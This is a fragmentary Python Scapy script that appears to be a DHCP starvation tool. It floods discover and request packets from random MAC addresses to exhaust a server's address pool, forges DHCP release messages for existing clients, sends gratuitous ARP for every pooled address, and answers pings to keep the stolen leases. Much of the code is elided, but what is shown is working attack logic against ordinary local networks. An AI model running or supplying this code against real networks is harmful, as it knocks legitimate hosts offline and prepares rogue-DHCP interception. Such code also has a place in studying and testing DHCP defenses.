...
def release():
    ...
    for cmac, cip in nodes.iteritems():
        dhcp_release = Ether(src=cmac, dst=dhcpsmac) / IP(src=cip, dst=dhcpsip) / UDP(sport=68, dport=67) / BOOTP(ciaddr=cip, chaddr=[mac2str(
            cmac)], xid=myxid,) / DHCP(options=[("message-type", "release"), ("server_id", dhcpsip), ("client_id", chr(1), mac2str(cmac)), "end"])
...
def garp():
    ...
    for ip in pool:
        m = randomMAC()
        arpp = Ether(src=m, dst="ff:ff:ff:ff:ff:ff") / \
            ARP(hwsrc=m, psrc=ip, hwdst="00:00:00:00:00:00", pdst=ip)
...
class send_dhcp(threading.Thread):
    ...
    def run(self):
        ...
        while not self.kill_received and not dhcpdos:
            m = randomMAC()
            myxid = random.randint(1, 900000000)
            hostname = ''.join(random.choice(
                string.ascii_uppercase + string.digits) for x in range(8))
            dhcp_discover = Ether(src=m, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(
                chaddr=[mac2str(m)], xid=myxid) / DHCP(options=[("message-type", "discover"), ("hostname", hostname), "end"])
    ...
    def run(self):
        ...
        while not self.kill_received and not dhcpdos:
            sniff(filter=self.filter, prn=self.detect_dhcp,
                  store=0, timeout=3, iface=interface)
    ...
    def detect_dhcp(self, pkt):
        ...
        if DHCP in pkt:
            if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                ...
                myhostname = ''.join(random.choice(
                    string.ascii_uppercase + string.digits) for x in range(8))

                print("DHCPOFFER handing out IP: " + myip)
                if verbose:
                    print("DHCPOFFER detected from " +
                          pkt[Ether].src, sip + " on " + interface + ", handing out IP: " + myip)

                dhcp_req = Ether(src=localm, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=[mac2str(localm)], xid=localxid) / DHCP(
                    options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip), ("hostname", myhostname), ("param_req_list", "pad"), "end"])
            ...
            if pkt[ICMP].type == 8:
                ...
                icmp_req = Ether(src=randomMAC(), dst=pkt.src) / IP(src=myip, dst=mydst) / ICMP(
                    type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / "12345678912345678912"
                if verbose:
                    print "%r" % icmp_req
